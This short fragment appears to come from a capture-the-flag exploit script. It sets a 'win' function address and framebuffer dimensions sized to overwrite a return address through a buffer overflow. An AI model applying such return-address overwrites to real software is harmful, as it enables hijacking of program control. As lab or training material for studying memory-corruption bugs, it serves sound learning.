...
WIN_ADDR = 0x2058	      # Address of win function
...
header_width = 168 # This sets the framebuffer dimensions
header_height = 1
...
control_width = 168   # Copy exactly enough bytes to overwrite return address
